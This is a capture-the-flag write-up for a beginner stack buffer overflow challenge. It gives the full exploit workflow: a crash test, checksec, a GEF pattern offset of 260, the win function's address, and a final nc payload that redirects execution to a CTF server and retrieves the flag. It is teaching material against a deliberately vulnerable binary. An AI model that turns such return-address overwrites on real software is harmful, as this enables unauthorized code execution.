# Baby buffer overflow
Pwn, 100 Points

Author: oldwayfarer

Writeup By: **KanvK**

## Description

We received new message from kackers. They laugh at us being sure that no one will ever be able to break them and even left a description of what needs to be done. Show them what happens to overly confident people!

nc tasks.open.kksctf.ru 10002


> https://drive.google.com/open?id=1xSswzDDa0lhtGZ2zfhkRr_kNHD0pcdIy

## Solution

We're given baby_bof. Just from the name, we can infer that that this is likely an overflow problem. Let's test this theory out.

```
python -c "print 'A' * 300" | ./baby_bof
We have prepared a buffer overflow for you
Can you get use of it?
Enter your name: Hello, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!
Segmentation fault
```

A segfault, as suspected. Now let's exploit this. To start off, let's analyze this file.

```
file baby_bof && checksec baby_bof
baby_bof: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=679ffb807feb7aef6982de068fe64bb6deb7fb0c, not stripped
[*] '/root/Downloads/baby_bof'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE
```

We can see that this is a 32 bit file and PIE is not enabled so this should be a simple exploit. Let's open this file up in gdb and run it.

```
gdb -q ./baby_bof
GEF for linux ready, type `gef' to start, `gef config' to configure
79 commands loaded for GDB 8.3.1 using Python engine 3.7
[*] 1 command could not be loaded, run `gef missing` to know why.
Reading symbols from ./baby_bof...
(No debugging symbols found in ./baby_bof)
gef➤  pattern create 512
[+] Generating a pattern of 512 bytes
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaaf
[+] Saved as '$_gef0'
gef➤  r
Starting program: /root/Downloads/baby_bof 
We have prepared a buffer overflow for you
Can you get use of it?
Enter your name: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaaf
Hello, aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaaf!

Program received signal SIGSEGV, Segmentation fault.
0x63616170 in ?? ()
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────── registers ────
$eax   : 0x0       
$ebx   : 0x6361616e ("naac"?)
$ecx   : 0xffffaccc  →  "Hello, aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaa[...]"                                                                     
$edx   : 0xf7fb4010  →  0x00000000
$esp   : 0xffffd330  →  "qaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaadda[...]"                                                                     
$ebp   : 0x6361616f ("oaac"?)
$esi   : 0xf7fb2000  →  0x001d6d6c ("lm"?)
$edi   : 0xf7fb2000  →  0x001d6d6c ("lm"?)
$eip   : 0x63616170 ("paac"?)
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 
──────────────────────────────────────────────────────────────── stack ────
0xffffd330│+0x0000: "qaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaadda[...]"       ← $esp                                                            
0xffffd334│+0x0004: "raacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadea[...]"                                                                         
0xffffd338│+0x0008: "saactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfa[...]"                                                                         
0xffffd33c│+0x000c: "taacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadga[...]"                                                                         
0xffffd340│+0x0010: "uaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadha[...]"                                                                         
0xffffd344│+0x0014: "vaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadia[...]"                                                                         
0xffffd348│+0x0018: "waacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadja[...]"                                                                         
0xffffd34c│+0x001c: "xaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadka[...]"                                                                         
────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x63616170
────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "baby_bof", stopped, reason: SIGSEGV
──────────────────────────────────────────────────────────────── trace ────
───────────────────────────────────────────────────────────────────────────
```

Let's now search "paac" to find the offset.

```
gef➤  pattern search paac
[+] Searching 'paac'
[+] Found at offset 260 (big-endian search) 
```
Finally, by opening up the program in IDA and decompiling, we see that we need to call the win function with 0xCAFEBABE as a parameter for the program to print out the flag. Let's find the address of win.

```
readelf -s baby_bof | grep win
    65: 080485f6   138 FUNC    GLOBAL DEFAULT   14 win

```

Now let's convert all our addresses to little endian using python.

```
python3
Python 3.7.5 (default, Oct 27 2019, 15:43:29) 
[GCC 9.2.1 20191022] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> p32(0x080485f6)
b'\xf6\x85\x04\x08'
>>> p32(0xCAFEBABE)
b'\xbe\xba\xfe\xca'

```

Finally, let's make our payload and pipe it into the program. Make sure to add 4 bytes of padding between the win function and the parameter.

```
python -c "print 'A' * 260 + '\xf6\x85\x04\x08' + 'A' * 4 + '\xbe\xba\xfe\xca'" | nc tasks.open.kksctf.ru 10002
We have prepared a buffer overflow for you
Can you get use of it?
Enter your name: Hello, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�aaaa����!
Here it comes: kks{0v3rf10w_15_my_1!f3}

Segmentation fault

```


**Flag: kks{0v3rf10w_15_my_1!f3}**
